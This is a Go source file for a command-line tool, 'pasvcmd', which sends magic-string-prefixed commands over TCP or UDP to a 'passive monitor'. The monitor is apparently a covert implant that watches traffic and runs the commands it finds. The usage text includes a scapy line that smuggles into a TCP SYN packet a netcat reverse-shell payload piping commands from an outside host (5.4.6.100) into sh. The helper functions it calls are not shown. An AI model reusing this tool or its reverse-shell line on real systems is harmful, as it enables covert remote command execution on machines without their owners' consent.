package main

/*
 * pasvcmd.go
 * Send commands to a passive monitor
 * By J. Stuart McMurray
 * Created 20160227
 * Last Modified 20160227
 */

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
)

func main() {
	var (
		laddr = flag.String(
			"l",
			":80",
			"Local `address`",
		)
		raddr = flag.String(
			"r",
			"10.100.101.12:80",
			"Remote `address`",
		)
		magic = flag.String(
			"m",
			"COMMANDCOMMAND",
			"Magic `flag` to send",
		)
		proto = flag.String(
			"p",
			"tcp",
			"IP `protocol`, \"tcp\" or \"udp\"",
		)
		keep = flag.Bool(
			"k",
			false,
			"Keep connection alive when using tcp",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Reads commands from the standard input, one per line, and sends them to the
target, prefixed with the magic flag.  If TCP is used, a 3-way handshake will
be made, then the command will be sent.  If UDP is used, a single packet with
the magic flag and command will be sent.  If it is necessary to send the
command in a TCP SYN packet, a scapy line similar to the following may be used:

send(IP(dst="10.100.101.12")/TCP(
	sport=80,dport=80,flags='S')/
	'COMMANDCOMMANDnc 5.4.6.100 4444 | sh | nc 5.4.6.100 5555')

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Channel on which to pass read lines */
	lchan := make(chan string)

	/* Send commands from stdin to the sender */
	go stdin(lchan, *magic)

	/* Start sender */
	switch strings.ToLower(*proto) {
	case "tcp":
		tcp(*laddr, *raddr, lchan, *keep)
	case "udp":
		udp(*laddr, *raddr, lchan)
	default:
		log.Fatalf(
			"Unknown protocol %v.  "+
				"Please specify either tcp or udp.",
			*proto,
		)
	}

	log.Printf("Done.")
}
